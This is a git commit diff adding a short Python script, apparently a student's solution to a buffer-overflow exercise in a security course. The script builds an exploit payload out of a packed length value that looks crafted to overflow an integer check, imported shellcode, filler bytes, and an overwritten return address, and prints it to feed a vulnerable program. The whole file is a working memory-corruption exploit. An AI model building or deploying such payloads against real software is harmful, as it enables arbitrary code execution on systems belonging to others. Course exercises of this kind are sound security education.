5b37e74adc35a814aeb58ebfb8c4faafe51cb19e
Sujay Patwardhan <sujay.patwardhan@gmail.com>
2018-02-02 17:28:18 -0600

    1.2.5

--- mp1/1.2.5.py
+++ mp1/1.2.5.py
@@ -1,5 +1,9 @@
 from struct import pack
 from shellcode import shellcode
 
-print("")
-print("")
+
+addr = pack("<I", 0xbffeb860 - 0x6)
+
+takeoff = pack("<I", 0x80000006)
+offset = "E" * 0x45
+print(takeoff + shellcode + offset + addr)
